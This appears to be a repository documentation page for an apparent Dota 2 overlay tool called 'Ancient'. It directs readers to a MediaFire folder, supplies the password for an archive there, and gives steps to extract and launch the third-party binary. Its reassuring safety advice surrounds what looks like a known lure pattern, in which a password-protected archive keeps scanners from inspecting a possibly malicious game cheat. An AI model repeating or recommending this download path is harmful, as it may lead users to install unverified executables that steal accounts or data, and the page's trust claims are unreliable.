# Installation notes

This page is documentation for the Ancient community hub. The repository does
not contain an installer, loader, DLL, EXE, or game binary. The linked folder is
an external distribution point, and any package there is third-party software.

## Before you start

- Windows 10 or 11, x64.
- A current Dota 2 installation through Steam.
- The archive password: `5139237619`.
- A dedicated folder outside the Steam library.
- A backup of your current configuration, if you already have one.

## 1. Verify the download

1. Open the [download folder](https://www.mediafire.com/folder/xpuwhpaw2jpbi/Installer).
2. Download the archive once, not from a mirror or a direct-message link.
3. Check the archive size and, when a checksum is published, compare it with a
   local `Get-FileHash` result.
4. Scan the archive with your normal security tooling before unpacking it.

Do not disable antivirus, SmartScreen, or Windows Defender to make a download
work. A package that requires that is not a normal documentation dependency.

## 2. Unpack cleanly

- Extract into a new empty folder, for example `D:\Tools\Ancient`.
- Do not extract into `steamapps\common\dota 2 beta`.
- Avoid running anything directly from `Downloads`.
- Keep the original archive until the setup is stable.

## 3. First launch

Follow the vendor instructions that come with the external package. Generic
guidance for overlay-style tools:

1. Close Dota 2 and any overlay that hooks the same graphics API.
2. Use windowed borderless if the overlay does not appear in fullscreen.
3. Start the game first, then the external tool, unless the vendor says otherwise.
4. Run as administrator only if the vendor documents a concrete reason.
5. If the game crashes, remove the tool and test the game without it first.

This hub cannot verify the behavior of a third-party build. Treat first launch as
a test session: use a separate account only if you accept the risk.

## 4. Keep a rollback path

- Save the previous archive before updating.
- Export your configuration before changing profiles.
- Record the game build, GPU driver, and tool version.
- If the game or overlay becomes unstable, remove the new files and restore the
  previous archive.

## 5. Uninstall

1. Close Dota 2 and the external tool.
2. Delete the dedicated tool folder.
3. Remove any startup entry or scheduled task the tool created.
4. Restore your configuration backup if the tool changed game settings.
5. Verify the game launches without the tool before reinstalling anything.

## What this repository will never ask for

- Your Steam password, session token, or Steam Guard code.
- Your GitHub password or personal access token.
- A payment in a direct message.
- Permission to disable antivirus or firewall protection.

If a download or support message asks for any of these, stop and report it.

## Related pages

- [Configuration](configuration.md)
- [Safety](safety.md)
- [Troubleshooting](troubleshooting.md)
